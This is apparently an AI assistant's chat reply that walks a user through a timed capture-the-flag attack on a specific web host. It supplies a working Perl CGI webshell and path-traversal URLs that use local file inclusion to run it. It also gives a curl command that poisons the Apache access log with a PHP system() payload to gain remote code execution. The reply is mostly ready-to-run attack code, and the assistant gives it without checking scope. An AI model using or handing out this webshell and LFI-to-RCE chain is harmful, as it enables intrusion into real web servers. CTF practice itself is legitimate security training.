Yes, your plan is solid. Here’s how you can proceed **quickly** within the 30-minute CTF:

---

### ✅ **Objective: Use Webshell via LFI to Get the Flag**

If **RCE is not directly exposed** but **LFI is available**, **you can still achieve RCE** by using **Log Poisoning** or **webshell planting**, then trigger it via LFI.

---

## 💥 PLAN:

### 1. **If File Upload + RCE (webshell) is Available**

- Upload a simple **Perl, PHP, or Bash** webshell (depending on what the server accepts).

#### Example: Perl Webshell (backdoor.pl)

```perl
#!/usr/bin/perl
use CGI;
print "Content-type: text/html\n\n";
my $q = new CGI;
my $cmd = $q->param('cmd');
print "<pre>";
print `$cmd`;
print "</pre>";
```

- Upload this and take note of its location (e.g., `/uploads/backdoor.pl`).

---

### 2. **Use LFI to Trigger the Webshell**

If you **can't directly access** the uploaded shell due to routing or path restrictions, **trigger it using LFI**.

#### Example:

```
http://hacksmith.webhop.me:5565/?page=../../../../../../var/www/html/uploads/backdoor.pl&cmd=cat /home/ctf/flag.txt
```

> You’re using the LFI endpoint to **execute the uploaded shell** and **pass commands via GET param**.

---

### 3. **If Webshell Doesn’t Work, Use LFI for Log Poisoning**

If file upload is not working or blocked, try **log poisoning**:

- Inject your payload into access logs:

```bash
curl "http://hacksmith.webhop.me:5565" -A "<?php system($_GET['cmd']); ?>"
```

- Then access via LFI:

```bash
http://hacksmith.webhop.me:5565/?page=../../../../var/log/apache2/access.log&cmd=cat /home/ctf/flag.txt
```

---

### 4. **Confirm with `cat` or `ls` Commands**

Try common flag locations:

```bash
cmd=ls /home/ctf/
cmd=cat /home/ctf/flag.txt
```

---

## 🏁 Final Objective: Get Output Like:

```
FLAG: P3RL_B3AST
```

Take screenshot & save it for submission.

---

Let me know if you're limited to **Perl only** — I’ll modify shell accordingly. Good luck, Gaurav — use your time wisely!